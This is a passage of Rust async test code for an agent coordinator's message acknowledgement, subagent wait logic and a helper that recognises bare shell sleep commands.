    assert!(compact[0].get("text").is_none());

    assert_eq!(ack(json!({"message_ids": [ids[0]]})).await["count"], 1);
    assert_eq!(ack(json!({"up_to": ids[2]})).await["count"], 2);
    let last = unread(json!({"ack": true})).await;
    assert_eq!(last.as_array().unwrap().len(), 1);
    assert_eq!(last[0]["message_id"], ids[3]);
    assert_eq!(unread(json!({})).await, json!([]));
    assert_eq!(ack(json!({"all": true})).await["count"], 0);
    // The one-message form keeps working, including a repeat acknowledgement.
    assert_eq!(
        ack(json!({"message_id": ids[0]})).await["acknowledged"],
        true
    );
    scratch.discard().await;
}

#[tokio::test]
async fn an_idle_child_does_not_end_waits_for_a_running_one() {
    let (_directory, scratch, coordinator, root, worker) = waiting_team().await;
    {
        let mut table = coordinator.table.lock().await;
        let idle = table.reserve("audit", &launch()).unwrap();
        let entry = table.entries.get_mut(&idle.session_id).unwrap();
        entry.snapshot.status = SubagentStatus::Ready;
        entry.snapshot.final_text = Some("audit finished earlier".to_string());
    }
    let wait = || {
        let coordinator = coordinator.clone();
        tokio::spawn(async move {
            coordinator
                .wait_for(root, Duration::from_secs(1800), WaitSignals::default())
                .await
                .unwrap()
        })
    };
    // Shown once, because this parent has not seen it yet...
    let first = wait().await.unwrap();
    assert_eq!(first["changes"][0]["task_name"], "/root/audit");
    // ...and then never again: the parent live-reported three identical
    // immediate returns here before the fix.
    let waiting = wait();
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(
        !waiting.is_finished(),
        "an idle child must not end the wait"
    );
    child_event(
        &coordinator,
        worker,
        SessionEventKind::StatusChanged {
            status: SessionStatus::Failed,
            detail: Some("tests failed".to_string()),
        },
    )
    .await;
    let result = tokio::time::timeout(Duration::from_secs(5), waiting)
        .await
        .expect("the running child's change ends the wait")
        .unwrap();
    let changes = result["changes"].as_array().unwrap();
    assert_eq!(changes.len(), 1);
    assert_eq!(changes[0]["task_name"], "/root/worker");
    assert_eq!(changes[0]["status"], "failed");
    scratch.discard().await;
}

#[test]
fn only_a_blind_sleep_earns_the_wait_agent_hint() {
    assert_eq!(bare_sleep_seconds("sleep 300; echo waited"), Some(300));
    assert_eq!(bare_sleep_seconds("  sleep 5m && echo done"), Some(300));
    assert_eq!(bare_sleep_seconds("sleep 240"), Some(240));
    assert_eq!(bare_sleep_seconds("sleep 300 && cargo test"), None);
    assert_eq!(bare_sleep_seconds("sleep 60; echo x; rm -rf build"), None);
    assert_eq!(bare_sleep_seconds("make && sleep 300"), None);
}
